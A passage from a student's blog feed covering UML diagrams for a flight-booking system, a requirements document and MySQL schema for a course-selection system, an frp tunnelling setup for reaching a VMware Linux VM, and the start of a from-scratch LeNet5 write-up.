获取账单信息(TicketGenerator类→Bill类)</p><p>→获取航班信息(TicketGenerator类→Flight类)</p><p>→等待账单信息和航班信息准备好(TicketGenerator类→TicketGenerator类</p><p>→返回账单信息(Bil类→TicketGenerator类)</p><p>→返回航班信息(Flight类→TicketGenerator类)</p><p>→生成票据(TicketGenerator类→TicketGenerator类)</p><p>→打印票据(TicketGenerator类→TicketGenerator类)</p><p>→返回机票给旅客(TicketGenerator类→旅客)</p></blockquote><p>这个顺序图展示了旅客乘机所需要经历的完整流程，比较复杂。其中需要着重注意的过程是用户预定后生成的账单是未付款的状态，需要提醒用户进行付款。15分钟未付款账单被销毁。同时，产生机票的过程中需要同时获取账单信息和航班信息，这个过程是无依赖的，因此可以采用异步的方式并行执行。但取票机需要两个信息都获取后才能打印机票，因此需要等待。</p><h2 id="协作图">协作图</h2><p>协作图相比顺序图，更强调类与类之间在空间上的交互。事实上，协作图和顺序图是等价的，可以相互转化。</p><p>下面给出用户退票用例的协作图。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210432463999_484_20230409235306483524_888_image-20230409222120459.png" alt="image-20230409222120459"><figcaption aria-hidden="true">image-20230409222120459</figcaption></figure><blockquote><p>→查询已订机票(旅客→系统前端)</p><p>→提交查询请求(系统前端→DAO)</p><p>→执行查询计划(DAO→DB)</p><p>→返回已订机票列表(DB→DAO)</p><p>→传送已订机票列表(DAO→系统前端</p><p>→展示已订机票(系统前端→旅客)</p><p>→选择欲退票对应账单(旅客→系统前端)</p><p>→发起退票请求(系统前端→DAO)</p><p>→查询是否付款及账单金额(DAO→DB)</p><p>→返回账单信息(DB→DAO)</p><p>→传送账单信息(系统前端→DAO)</p><p>→[opt]发起退款(系统前端→支付系统)</p><p>→[opt]退款给用户(支付系统→旅客）</p><p>→[opt]返回退款结果(系统前端→支付系统)</p><p>→展示退票成功消息(系统前端→旅客)</p></blockquote><p>这一部分与用户个人信息管理部分类似。额外的部分主要是账单有已付款和未付款两种状态，如果账单已付款，我们还需要将账单金额退还给用户。</p><h2 id="状态图">状态图</h2><p>状态图与活动图相似，只是顾名思义，状态图更多的强调一个对象在不同情形下的状态变化。</p><p>下面给出管理员整个工作流程的状态图：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210433617962_729_20230409235308064551_965_image-20230409225349414.png" alt="image-20230409225349414"><figcaption aria-hidden="true">image-20230409225349414</figcaption></figure><p>这一部分结合实际比较容易理解。管理员进入系统后可以选择进行个人信息管理，或进行系统其他部分的管理。当进行其他部分管理时均为工作状态。管理员对航班、旅客或账单进行常规的增删改查后，完成工作，注销账号。在已登录状态注销账号进入未登录状态。管理员不管完成工作与否随时可注销账号。</p><h2 id="构件图">构件图</h2><p>构件图通过模块和接口，能够很好的呈现和理清模块之间的依赖关系，有助于实现整个系统的高内聚低耦合。</p><p>圆圈代表接口，连接圆圈的模块实现该接口，包围圆圈的模块依赖该接口。</p><p>下面是整个预订系统的构件图。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210434840176_157_20230409235310195363_408_image-20230409231814194.png" alt="image-20230409231814194"><figcaption aria-hidden="true">image-20230409231814194</figcaption></figure><p>可以看到整个系统的依赖关系还是较为复杂的。一定程度上构件图是对类图依赖关系的强化。</p><h2 id="部署图">部署图</h2><p>部署图描述了一个系统运行时的硬件特点和在这些节点上运行的软件构件。部署图贴近“落地”，关注物理的运行，以及它们之间如何彼此通信。</p><p>下面是该预订系统的部署图。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210436138065_382_20230409235311789954_391_image-20230409234037704.png" alt="image-20230409234037704"><figcaption aria-hidden="true">image-20230409234037704</figcaption></figure><p>我们的系统是前后端分离的，通过TCP/IP协议进行信息交互。同时采用MariaDB作为数据库。软件开发商需要提供前端WebAPP，以及后端的实现，还要设计数据库模式。硬件上我们需要存储数据信息以及运行应用的服务器，应对高并发我们还要加设防火墙，并设置负载均衡节点。当然，为了让用户取票据和纸质凭据，我们还需要嵌入式系统和打印机。</p><h2 id="总结">总结</h2><p>不同的UML图示有不同的特点和适用场景。以上为各个场景根据不同种类的图示特点选取了不同的描述方式，总体上从各种粒度和各个角度覆盖了整个机票预订系统最需要我们关注的地方，对整个系统有了更加清晰的了解，为敏捷开发，DevOps等活动打下较好的基础。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件工程-需求分析作业</title>
    <link href="/posts/53897/"/>
    <url>/posts/53897/</url>
    
    <content type="html"><![CDATA[<h1 id="在线选课管理系统需求分析">在线选课管理系统需求分析</h1><p>2013599 田佳业</p><h2 id="一引言">一、引言</h2><h3 id="编写目的">编写目的</h3><ul><li><p>对要实现的软件功能做总体描述，帮助判断所规定的软件是否符合当前要求。</p></li><li><p>尽可能的除了在管理日常教学事务层面活动的同时考虑后续各种情况，使系统具有良好的可拓展性。</p></li><li><p>提高开发效率，为成本计划和编制计划进度提供基础。</p></li></ul><h3 id="项目背景">项目背景</h3><p>学校选课信息数据庞杂，且各种限制条件繁多，由教师及管理员手动进行选课信息处理负担较重，且效率极低，耽误正常教学工作的进行。而学生选课系统的应用将使选课管理工作规范化，系统化，程序化，避免选课管理的随意性，提高信息处理的速度和准确性，能够及时，准确，有效的查询和修改选课情况。系统的主要功能是为了方便学校对教师信息、学生基本信息、课程信息、学生成绩录入、修改、查询，提高学校的工作效率。</p><h2 id="二任务概述">二、任务概述</h2><h3 id="任务目标">任务目标</h3><p>本项目所开发的学生选课系统完成学校对学生的选课信息的统计与管理，减少数据错漏的情况，同时也节约人力、物力和财力，告别以往的人工统计。学生在规定选课时间段内在校园网内(特殊时期可开放外网访问)登录选课系统完成选课的申请，而学校可以方便地对系统进行管理和控制，提高工作效率。方便学生、老师、教务处使用，学生可以在线查看可选课程信息、在线选课、补选、退选等，老师可以填写和修改自己的课程信息，查询自己的课程人数、课程信息（包括开课时间、地点、开课方式），教务处可以对整个系统进行管理（包括系统管理、用户管理、课程管理）。</p><h3 id="用户特点">用户特点</h3><ul><li><p>管理员</p><p>具备整个系统的所有权限，如可在选课前中后对课程信息进行调整，指定教师和学生的权限，调整筛选策略等。</p></li><li><p>教师</p><p>具备自己所教授的课程的管理权限。如录入课程信息等。</p></li><li><p>学生</p><p>学生需要在指定时间选课，通常情况下登录系统时间较为集中，可针对自己的课表进行安排。</p></li></ul><h3 id="假定和约束">假定和约束</h3><h4 id="假定">假定</h4><ul><li><p>用户：假定该选课系统主要服务于学生和教师，其中学生可登录系统进行选课和查看课程表，教师可登录系统进行课程管理和成绩管理。其他外来人员能够通过通过验证码的方式进行屏蔽。</p></li><li><p>性能：选课系统有较高性能要求，例如响应时间、并发处理能力、系统可用性等。</p></li><li><p>数据完整性：假定该选课系统能够通过数据备份，定期检查等方式保证所处理的数据的完整性和准确性，以避免数据错误和损坏。</p></li><li><p>用户交互：假定用户可能通过手机或电脑进入浏览器选课。</p></li><li><p>拓展性：假定学校根据需要可对选课系统进行调整，如调整选课时间，二学位课和主修课对换等。</p></li></ul><h4 id="约束">约束</h4><ul><li><p>项目需要在学生选课前15天(8月16日前)开发完成，至少需满足本文档下述的全部需求。</p></li><li><p>项目以chrome内核浏览器显示界面为UI标准，能够在PC端和移动端完整显示。不对IE浏览器UI显示做要求，但需要在IE浏览器能够正常使用所有功能。</p></li><li><p>项目总预算xx万元，其他事宜详见项目合同。</p></li></ul><h2 id="三业务描述">三、业务描述</h2><h3 id="系统总业务流程图及其描述">系统总业务流程图及其描述</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210646449880_738_20230409235202901387_783_image-20230227190111733.png" alt="image-20230227190111733"><figcaption aria-hidden="true">image-20230227190111733</figcaption></figure><ul><li><p>学生</p><p>登录系统，查看课表或进行选课。选课分为预选、正选和补退选三个阶段。有辅修/双学位的学生还需要进行辅修选课。</p></li><li><p>教师</p><p>登录系统，录入课程信息，或查看自己所教授课程的选课情况。</p></li><li><p>管理员</p><p>查看或修改用户的信息或权限。以及处理选课过程中的数据，并负责处理教师修改信息相关的申请。</p></li></ul><h3 id="各个子业务流程图及其描述">各个子业务流程图及其描述</h3><h4 id="学生选课">学生选课</h4><p>下面以主修选课为例，说明选课子业务的流程：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210649539046_353_20230409235205419738_553_image-20230302191509591.png" alt="image-20230302191509591"><figcaption aria-hidden="true">image-20230302191509591</figcaption></figure><p>选课需要在对应时间选课，并根据学生点击选课入口进行对应课程的子入口。学生课根据课程序号，课程名称等进行课程的搜索，点击“选课”按钮进行选课。若已选过，应当显示“退课”。然后进行条件初步判断，若满足条件选课成功，返回分入口。</p><h4 id="其他子业务">其他子业务</h4><p>其他子业务均为单流程，满足对应业务各自约束即可。</p><h2 id="四数据需求">四、数据需求</h2><h3 id="数据需求描述">数据需求描述</h3><ol type="1"><li>学生信息：包括学生的个人基本信息：学号、姓名、性别、入学时间、学院。</li><li>课程信息：包括课程的基本信息：课程编号（内部唯一ID)、课程代号（前端展示)、课程名称、课程学分、授课教师、上课时间、课程选课人数上限。</li><li>选课信息：包括学生选课的信息：选课记录编号、学生学号、课程编号、选课时间。</li><li>教师信息：包括教师的基本信息：教师编号、姓名、性别、职称。</li></ol><h3 id="数据流图">数据流图</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210650750888_483_20230409235207392543_716_image-20230307231017064.png" alt="image-20230307231017064"><figcaption aria-hidden="true">image-20230307231017064</figcaption></figure><h3 id="数据字典">数据字典</h3><p>下面采用数据库表的方式描述项目主要流程中使用的数据字典：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210652278097_565_20230409235209631863_631_image-20230308091548193.png" alt="image-20230308091548193"><figcaption aria-hidden="true">image-20230308091548193</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ey9x2dlluxp18z"></i><span>sql</span><div class="collapse show" id="collapse-ey9x2dlluxp18z"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> NAMES utf8mb4;<span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Course</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `Course`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `Course` (  `CourseID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `CourseCode` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `CourseName` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Credits` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Teacher` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `MaxCapccity` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `StartWeek` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `EndWeek` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Place` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Select</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `<span class="hljs-keyword">Select</span>`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">Select</span>` (  `SelectID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `StudentID` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `CourseID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `SelectTime` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Student</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `Student`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `Student` (  `studentID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Name` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Gender` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Age` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Institute` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Teacher</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `Teacher`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `Teacher` (  `TeacherID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `TeacherName` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Gender` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Title` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;</code></pre></div></div><p>注意:</p><p>1.由于选课系统会频繁进行数据表的插入删除，设置外键会使数据库性能下降，故需将异常处理交由软件处理，以加快正常情况下的选课相应速度。</p><p>2.数据表及数据表项可根据实际开发进行添加，但以上所列出为必需项。</p><h2 id="五功能需求">五、功能需求</h2><h3 id="功能划分">功能划分</h3><h4 id="公共功能">公共功能</h4><ul><li><p>登录</p></li><li><p>查看当前选课状态</p></li><li><p>查看课程信息</p></li></ul><h4 id="学生">学生</h4><ul><li><p>选课</p></li><li><p>退课</p></li><li><p>查看可选和已选课程</p></li></ul><h3 id="教师">教师</h3><ul><li><p>发布课程信息</p></li><li><p>请求修改课程信息</p></li></ul><h4 id="管理员">管理员</h4><ul><li><p>录入和修改用户信息</p></li><li><p>选课结果汇总</p></li><li><p>筛选选课结果</p></li></ul><h3 id="功能描述">功能描述</h3><h4 id="登录">登录</h4><p>用户输入用户名和密码登录选课系统，系统根据输入的信息验证用户身份，并进入相应的用户界面。</p><h4 id="查看当前选课状态">查看当前选课状态</h4><p>在选课系统中查看当前各个课程选课人数（<strong>不包含具体选课的学生信息</strong>)</p><h4 id="查看课程信息">查看课程信息</h4><p>在选课系统中查看课程的详细信息，包括课程名称、授课教师、上课时间、上课地点、学分等。</p><h4 id="选课">选课</h4><p>学生可以在选课系统中选择需要选修的课程，并提交选课请求。系统会根据当前选课人数进行相应，并在不同选课阶段之间根据筛选条件进行进行审核，审核通过后自动为学生添加选课记录。</p><h4 id="退课">退课</h4><p>学生可以在选课系统中查看已选课程，并选择需要退选的课程。提交退课请求后，系统会自动删除相应的选课记录。</p><h4 id="查看可选和已选课程">查看可选和已选课程</h4><p>学生可查看当前选课阶段可选和已选的课程，以列表方式呈现。</p><h4 id="发布课程信息">发布课程信息</h4><p>教师可以在选课系统中发布课程信息，包括课程名称、授课教师、上课时间、上课地点、学分等。发布后，学生可以在选课系统中进行选课操作。</p><h4 id="请求修改课程信息">请求修改课程信息</h4><p>当教师需要对已发布的内容进行修改，如修改上课地点，修改可容纳人数等。</p><h4 id="录入和修改用户信息">录入和修改用户信息</h4><p>管理员可以在选课系统中录入和修改学生和教师的个人信息，包括姓名、学号、联系方式、职称、专业等。</p><h4 id="选课结果汇总">选课结果汇总</h4><p>管理员可以在选课系统中查看所有学生的选课情况，并对选课结果进行汇总统计，包括已选课程、未选课程和已退课程。<strong>注意：需要按照课程和学生两种维度分别给出结果汇总。</strong></p><h4 id="筛选选课结果">筛选选课结果</h4><p>管理员可以在选课系统中对选课结果进行筛选和分析，根据不同的条件进行查询，包括学生学号、课程编号、成绩等级等。同时管理员可以对查询结果进行导出和打印。</p><h2 id="六非功能需求">六、非功能需求</h2><ol type="1"><li>性能：由于正选阶段学生选课时间集中，选课系统应具有高性能，能够支持大量的并发用户访问，并快速响应用户的请求，避免出现系统瓶颈或崩溃现象。即便确实出现了瓶颈，也应及时进行自发控制，避免系统崩溃。</li><li>可靠性：系统应具有高可靠性，保证数据的完整性、安全性和可用性，有数据库日志及备份和恢复功能。</li><li>安全性：系统应具有高安全性，对用户数据进行保护，包括用户个人信息和选课记录等敏感数据，确保数据不被窃取、篡改或损坏。</li><li>易用性：系统应具有高易用性，界面友好、操作简单，学生可以快速地进行选课和退课等操作，避免学生使用过程中出现操作困难或错误，<strong>特别注意避免出现误容易出现误导操作的UI布局或文字描述</strong>。管理员页面由于需显示数据较多，需要采用较为简洁的界面，利于管理和维护。</li><li>可扩展性：系统应具有高可扩展性，能够灵活地添加新的功能和模块，以适应不同阶段或特殊/紧急状态的需求。</li><li>软件质量：系统应具有高软件质量，包括高代码质量、高稳定性、高可维护性、高可测试性和高可重用性等。同时，系统应具有高可靠性、高安全性和高可用性等。<strong>特别的，代码需要有明确的功能描述注释及负责人信息，确保可追溯</strong>。</li><li>兼容性：系统应具有高兼容性，能够在不同的操作系统、设备上运行，在Chrome和Firefox上均需保证界面正确和功能完全可用，IE浏览器需保证界面可见和功能完全可用，确保用户能够方便地访问和使用系统。</li></ol><h2 id="七系统要求">七、系统要求</h2><p>需部署在CentOS7.7（或基于此二次开发的兼容系统)，使用docker进行环境和打包，并提供需挂载的数据。</p><p>服务器2核CPU，带宽4M，内存8GB。</p><p>Docker使用LAMP环境，具体版本要求：</p><blockquote><p>PHP&gt;=7.4且&lt;9.0</p><p>MySQL&gt;=8.0</p><p><strong>务必不要使用5.x版本的Mysql</strong></p><p>Apache&gt;=2.4.6</p></blockquote><p>使用PHP框架或JSP框架开发均可。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用frp内网穿透远程访问Vmware虚拟机</title>
    <link href="/posts/18710/"/>
    <url>/posts/18710/</url>
    
    <content type="html"><![CDATA[<h1 id="使用frp内网穿透远程访问vmware虚拟机">使用frp内网穿透远程访问Vmware虚拟机</h1><h2 id="为什么需要内网穿透功能">为什么需要内网穿透功能</h2><p>大三的课程实验大多需要x86的linux环境，如果可以使用mac甚至手机或平板就可以远程访问Windows中的linux虚拟机，那就不用背着沉重又特别容易没电的游戏本跑来跑去了。经过一番探索发现内网穿透可以满足我的需求。</p><p>如果有自己的云服务器(关键是有公网ip)，便可以使用开源的frp工具进行内网穿透。开干！</p><h2 id="参考">参考</h2><p>本文只供个人记录过程方便后续所用，若需详细过程可以参考下面的文章:</p><p>基础使用</p><p>https://sspai.com/post/52523</p><p>配置开机自启(注意需要管理员权限)</p><p>https://gofrp.org/docs/setup/systemd/</p><h2 id="操作步骤">操作步骤</h2><p>服务器和客户端都需要下载:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-653b6plln8zueq"></i><span>shell</span><div class="collapse show" id="collapse-653b6plln8zueq"><pre><code class="hljs shell">wget https://github.com/fatedier/frp/releases/download/v0.47.0/frp_0.47.0_linux_amd64.tar.gz</code></pre></div></div><p><strong>注:下载时一定要注意选对系统架构。比如2016南京大学PA的环境是32位Ubuntu，就要下<code>frp_0.47.0_linux_386.tar.gz</code>。</strong></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y4tlgqlln8zueq"></i><span>shell</span><div class="collapse show" id="collapse-y4tlgqlln8zueq"><pre><code class="hljs shell">wget https://github.com/fatedier/frp/releases/download/v0.47.0/frp_0.47.0_linux_386.tar.gz</code></pre></div></div><p>解压</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0lffw9lln8zueq"></i><span>shell</span><div class="collapse show" id="collapse-0lffw9lln8zueq"><pre><code class="hljs shell">tar -zxvf frp_0.47.0_linux_amd64.tar.gz</code></pre></div></div><p>改名。非必须，但方便后续配置</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pm5gl3lln8zueq"></i><span>shell</span><div class="collapse show" id="collapse-pm5gl3lln8zueq"><pre><code class="hljs shell">mv frp_0.47.0_linux_amd64 frp</code></pre></div></div><p>具体的配置项可以参见第一篇博客。<a href="https://gofrp.org/docs/examples/ssh/">官方</a>也说的很简洁明了。</p><p>按照官网里的<a href="https://gofrp.org/docs/setup/systemd/">开机自启</a>配置发现开机自启不成功，原因和解决方法可参见<a href="https://www.mmuaa.com/post/537d04e936b78620.html">这个博客</a></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hb7hx2lln8zueq"></i><span>shell</span><div class="collapse show" id="collapse-hb7hx2lln8zueq"><pre><code class="hljs shell">[Unit]<span class="hljs-meta prompt_"># </span><span class="language-bash">服务名称，可自定义</span>Description = frp clientAfter = network.target syslog.targetWants = network.target[Service]Type = simple<span class="hljs-meta prompt_"># </span><span class="language-bash">change to your own path of fps</span>ExecStart = /home/ubuntu32/frp/frpc -c /home/ubuntu32/frp/frpc.iniRestart=alwaysRestartSec=5[Install]WantedBy = multi-user.target</code></pre></div></div>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lenet5 手写数字分类</title>
    <link href="/posts/42585/"/>
    <url>/posts/42585/</url>
    
    <content type="html"><![CDATA[<h1 id="lenet5-手写数字分类">Lenet5 手写数字分类</h1><p>2013599 田佳业</p><h2 id="实验要求">实验要求</h2><p>用Python实现LeNet5来完成对MNIST数据集中10个手写数字的分类。不使用PyTorch或TensorFlow框架。</p><h2 id="网络结构">网络结构</h2><p>Lenet5的提出在当时主要依靠人工进行特征提取的时代无疑是划时代的。下面阐述原论文中Lenet5得到结构，并同时说明在此次作业中结合当前深度学习发展为加快训练速度和提高准确率做出的改进。</p><p>关于维度表示的说明：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210830689024_823_20230305200443272609_409_image-20230108195305664.png" alt="image-20230108195305664"><figcaption aria-hidden="true">image-20230108195305664</figcaption></figure><p>整体的结构图如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210831714613_857_20230305200444819985_702_image-20230108193022548.png" alt="image-20230108193022548"><figcaption aria-hidden="true">image-20230108193022548</figcaption></figure><ul><li><p>C1 卷积层。</p><p>滤波器（6,1,5,5)，步长为 1，无 padding，即输入通道数为1，滤波器数量（等于输出通道数）为 6，大小为5×5 使用偏置项 b。输出图像大小变为 6 × 28 × 28 。</p><blockquote><p>本次实验中由于图像是28*28的，为尽可能少的改变网络结构，将其进行padding，resize到32*32。</p></blockquote></li><li><p>S2 池化层</p><p>滤波器 大小 2×2，步长 为2，无 padding，输出矩阵大小为 14×14×6。 &gt;论文中采用的是平均池化，本次实验中采用最大池化，更能有效的提取关键特征。</p></li><li><p>C3 卷积层</p><p>滤波器 (16,6,5,5)，输出图像变为 16 × 5 × 5。</p><blockquote><p>论文中 C3卷积层的每个滤波器只与上一层中指定的通道进行连接。LeCun认为这样能减少参数数量的同时破坏不同核的对称性，希望不同的核去关注互补的特征。这种策略在现在看来事实上是一种静态的dropout策略，通常用于缓解过拟合。在Pytorch上实验发现会显著使准确率下降，因此不对其进行实现。</p></blockquote></li><li><p>S4 池化层</p><p>其设置与 S2 相同。 输出图像大小变为 5 × 5 × 16。</p></li><li><p>C5-C6 全连接层</p><p>其实现与一般的神经网络相同。比如C5图像大小仅为 5 ×5，与滤波器大小相同，因此该层与将输入拉平后进行全连接完全等价。</p></li><li><p>输出层</p><blockquote><p>论文中采用了欧氏径向基函数（RBF）输出层。RBF是将计算结果和标准图案进行像素级对比，即预先绘制数字的ASCII点阵图，然后计算输入向量和其欧式距离。这种方法使神经网络的输出有了一定的“可解释性”，但还是局限于特征工程，实现复杂且效果并不比普通的softmax变换好。</p></blockquote></li><li><p>激活和损失函数</p><blockquote><p>论文中采用类似于sigmoid的tanh函数作为激活函数，本次实验采用tanh作为激活函数，并在最后使用softmax归一，采用交叉熵误差作为损失函数。</p></blockquote></li></ul><p>体现在代码中，整个网络的结构定义如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-316bihlluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-316bihlluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLeNet5</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):        self.conv1 = layers.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>)        self.relu1 = layers.ReLu()        self.pool1 = layers.MaxPool2d((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>))        self.conv2 = layers.Conv2d(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>)        self.relu2 = layers.ReLu()        self.pool2 = layers.MaxPool2d((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>))        self.fc1 = layers.Linear(<span class="hljs-number">16</span> * <span class="hljs-number">5</span> * <span 